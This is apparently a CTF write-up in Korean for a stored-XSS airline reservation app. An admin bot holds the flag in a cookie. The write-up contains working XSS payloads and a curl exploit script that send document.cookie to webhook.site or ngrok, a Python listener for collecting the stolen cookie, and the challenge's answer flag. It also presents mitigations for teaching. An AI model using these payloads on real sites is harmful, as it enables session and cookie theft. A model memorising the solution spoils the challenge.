# Airline Reservation XSS with Bot

## Challenge Information

**Title**: Airline Reservation XSS with Bot  
**Author**: kjy  
**Category**: Web  
**Level**: Easy  
**Flag**: `Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}`

## Description

항공권 좌석 예약 시스템입니다.  
편리한 예약 서비스를 제공하고 있으며, 문제가 있을 경우 관리자에게 신고할 수 있습니다.

Connection: `http://localhost:8000`

관리자의 쿠키에 숨겨진 FLAG를 획득하세요!

## Vulnerability

이 챌린지는 **Stored XSS + Admin Bot** 취약점을 포함하고 있습니다.

### 취약점 상세

1. **클라이언트 측 취약점**
   - `index.html`의 `reservationAdd()` 함수에서 `innerHTML` 사용
   - 사용자 입력(이름 필드)이 HTML 엔티티 인코딩 없이 직접 DOM에 삽입됨

```javascript
dataRow.innerHTML = `
    <td>${row.id}</td>
    <td>${row.name}</td>  // XSS 취약점!
    <td>${row.seat}</td>
    <td>${row.ts}</td>
    <td><button onclick="deleteReservation('${row.seat}')">삭제</button></td>
`;
```

2. **서버 측 검증 부족**
   - `server.js`에서 이름 필드에 대한 HTML 태그 필터링이 없음
   - 길이(2글자 이상)만 체크하고 특수문자/HTML 태그 허용

3. **Admin Bot 기능**
   - `/report` 엔드포인트를 통해 Puppeteer 기반 관리자 봇이 페이지 방문
   - Bot의 쿠키에 FLAG가 저장되어 있음: `flag=Whois2025{...}`

```javascript
await page.setCookie({
    name: 'flag',
    value: FLAG,
    domain: 'localhost',
    path: '/',
    httpOnly: false,  // JavaScript로 접근 가능!
});
```

## Solution

### 전제 조건

쿠키를 수신할 외부 서버가 필요합니다:
- [Webhook.site](https://webhook.site) (권장)
- [RequestBin](https://requestbin.com)
- [Beeceptor](https://beeceptor.com)
- ngrok + 로컬 서버

### Step 1: Webhook 준비

1. https://webhook.site 접속
2. 자동 생성된 URL 복사 (예: `https://webhook.site/abc123...`)

### Step 2: XSS 페이로드 작성

쿠키를 Webhook으로 전송하는 페이로드:

**방법 1: fetch 사용 (권장)**
```html
<img src=x onerror="fetch('https://webhook.site/YOUR_ID?flag='+document.cookie)">
```

**방법 2: XMLHttpRequest 사용**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://webhook.site/YOUR_ID?flag=' + document.cookie);
xhr.send();
</script>
```

**방법 3: Image src 변경**
```html
<img src=x onerror="this.src='https://webhook.site/YOUR_ID?flag='+document.cookie">
```

### Step 3: 악성 예약 생성

1. 웹사이트 접속: `http://localhost:8000`
2. 탑승객 이름에 위 페이로드 입력 (YOUR_ID를 실제 Webhook ID로 변경)
3. 좌석: `7B` (아무 빈 좌석)
4. "예약하기" 버튼 클릭

### Step 4: Admin Bot 트리거

1. 페이지 하단의 "관리자에게 신고" 섹션으로 스크롤
2. 확인할 페이지 경로: `index.html`
3. "관리자에게 신고" 버튼 클릭
4. 약 3초 후 Admin Bot이 페이지를 방문하고 XSS 실행

### Step 5: FLAG 확인

1. Webhook.site 페이지로 돌아가기
2. 새로운 요청 확인
3. Query Parameters에서 FLAG 찾기

예시:
```
GET /?flag=flag=Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}
```

### FLAG
```
Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}
```

## Alternative Solutions

### 로컬 서버 사용 (ngrok)

```bash
# Terminal 1: 로그 수집 서버 실행
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        print(f'\\n[+] FLAG: {urllib.parse.parse_qs(query).get(\"flag\", [\"Not found\"])[0]}')
        self.send_response(200)
        self.end_headers()

HTTPServer(('', 9999), Handler).serve_forever()
"

# Terminal 2: ngrok 실행
ngrok http 9999
```

ngrok URL을 페이로드에 사용:
```html
<img src=x onerror="fetch('https://YOUR_NGROK_URL?flag='+document.cookie)">
```

### cURL로 Exploit

```bash
#!/bin/bash
TARGET="http://localhost:8000"
WEBHOOK="https://webhook.site/YOUR_ID"

# 악성 예약 생성
curl -X POST "$TARGET/api/reservations" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"<img src=x onerror=\\\"fetch('$WEBHOOK?flag='+document.cookie)\\\">\",\"seat\":\"7B\"}"

# Admin Bot 트리거
sleep 1
curl "$TARGET/report?path=index.html"

echo "Check your webhook!"
```

## Automated Exploit

### Python 스크립트

```bash
cd poc
python3 poc.py -e -w https://webhook.site/YOUR_ID
```

### Shell 스크립트

```bash
cd poc
chmod +x exploit.sh
./exploit.sh http://localhost:8000 https://webhook.site/YOUR_ID
```

## Deployment

### 로컬 테스트
```bash
cd private
npm install
npm start
```

### Docker 배포
```bash
cd private
docker-compose up -d
```

서비스는 `http://localhost:8000`에서 접근 가능합니다.

## Architecture

```
┌─────────────┐
│   Attacker  │
└──────┬──────┘
       │ 1. XSS 페이로드 주입
       │    (탑승객 이름에 악성 스크립트)
       ▼
┌─────────────────────────┐
│  Web Application        │
│  (Stored XSS 취약점)    │
└────────┬────────────────┘
         │ 2. /report 요청
         │    (Admin Bot 트리거)
         ▼
    ┌────────────┐
    │ Admin Bot  │
    │ (Puppeteer)│
    └─────┬──────┘
          │ 3. 페이지 방문
          │    쿠키: flag=Whois2025{...}
          ▼
    ┌───────────────┐
    │  index.html   │
    │  (XSS 실행)   │
    └───────┬───────┘
            │ 4. document.cookie 탈취
            │    fetch(webhook + cookie)
            ▼
      ┌──────────────┐
      │   Webhook    │
      │  (attacker)  │
      └──────────────┘
```

## Mitigation

이러한 XSS + Bot 공격을 방어하려면:

### 1. 입력 검증 및 필터링 (서버)

```javascript
// HTML 태그 제거
const sanitizedName = name.replace(/<[^>]*>/g, '');

// 또는 화이트리스트 방식
if (!/^[가-힣a-zA-Z\s]+$/.test(name)) {
    return res.status(400).json({ 
        message: '이름에 특수문자를 사용할 수 없습니다.' 
    });
}
```

### 2. 출력 인코딩 (클라이언트)

```javascript
// innerHTML 대신 textContent 사용
const td = document.createElement('td');
td.textContent = row.name;  // HTML 태그가 텍스트로 처리됨
dataRow.appendChild(td);

// 또는 DOMPurify 라이브러리 사용
dataRow.innerHTML = DOMPurify.sanitize(`
    <td>${row.id}</td>
    <td>${row.name}</td>
    ...
`);
```

### 3. HttpOnly 쿠키 설정

```javascript
await page.setCookie({
    name: 'flag',
    value: FLAG,
    domain: 'localhost',
    path: '/',
    httpOnly: true,    // JavaScript 접근 차단!
    secure: true,      // HTTPS only
    sameSite: 'strict' // CSRF 방지
});
```

### 4. CSP (Content Security Policy) 헤더

```javascript
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", 
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "connect-src 'self'"
    );
    next();
});
```

### 5. Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

const reportLimiter = rateLimit({
    windowMs: 60 * 1000, // 1분
    max: 5 // 최대 5회
});

app.get('/report', reportLimiter, async (req, res) => {
    // ...
});
```

## Learning Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [MDN - innerHTML Security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
- [OWASP Testing for Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)

## Files

- `public/`: 배포용 파일 (FLAG 제거됨)
- `private/`: 실제 챌린지 파일 (FLAG 포함)
- `poc/`: Proof of Concept 및 exploit 스크립트
  - `poc.py`: Python 자동화 스크립트
  - `exploit.sh`: Shell 스크립트
  - `README.md`: 상세한 exploit 가이드

## Troubleshooting

### Puppeteer가 실행되지 않을 때

```bash
# Docker에서 실행
cd private
docker-compose up -d
docker logs airline-reservation-xss
```

### Webhook이 응답하지 않을 때

- Webhook.site가 만료되었는지 확인
- 네트워크 방화벽 설정 확인
- 로컬 서버 + ngrok 사용 고려

### XSS가 실행되지 않을 때

- 브라우저 콘솔(F12)에서 에러 확인
- 페이로드의 따옴표 이스케이프 확인
- 예약 목록에서 HTML이 제대로 렌더링되는지 확인
